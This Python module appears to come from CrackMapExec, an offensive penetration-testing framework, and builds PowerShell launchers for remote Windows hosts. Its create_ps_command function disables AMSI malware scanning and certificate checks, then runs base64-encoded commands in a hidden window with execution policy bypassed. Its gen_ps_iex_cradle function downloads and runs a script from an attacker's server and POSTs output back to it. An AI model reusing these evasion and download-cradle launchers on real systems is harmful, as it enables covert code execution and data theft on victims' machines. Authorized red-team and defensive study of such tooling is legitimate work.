import cme
import os
import logging
import re
from base64 import b64encode

def get_ps_script(path):
    return os.path.join(os.path.dirname(cme.__file__), 'data', path)

def obfs_ps_script(script):
    """
    Strip block comments, line comments, empty lines, verbose statements,
    and debug statements from a PowerShell source file.
    """
    # strip block comments
    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script)
    # strip blank lines, lines starting with #, and verbose/debug statements
    strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
    return strippedCode

def create_ps_command(ps_command, force_ps32=False, nothidden=False):
    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
try{{
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}}catch{{}}
{}
""".format(ps_command)

    logging.debug('Unincoded command:\n' + ps_command)

    if force_ps32:
        command = """$command = '{}'
if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
{{

    $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
    IEX $exec
}}
else
{{
    $exec = [System.Convert]::FromBase64String($command)
    $exec = [Text.Encoding]::Unicode.GetString($exec)
    IEX $exec

}}""".format(b64encode(ps_command.encode('UTF-16LE')))

        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))

    elif not force_ps32:
        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))

    return command

def gen_ps_iex_cradle(server, addr, port, script_name, command):
    launcher = '''
    IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_script_name}');
    $cmd = {command};
    $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
    $request.Method = 'POST';
    $request.ContentType = 'application/x-www-form-urlencoded';
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd);
    $request.ContentLength = $bytes.Length;
    $requestStream = $request.GetRequestStream();
    $requestStream.Write( $bytes, 0, $bytes.Length );
    $requestStream.Close();
    $request.GetResponse();'''.format(server=server,
                                      port=port,
                                      addr=addr,
                                      ps_script_name=script_name,
                                      command=command)

    logging.debug('Generated PS IEX Launcher:\n {}'.format(launcher))

    return launcher
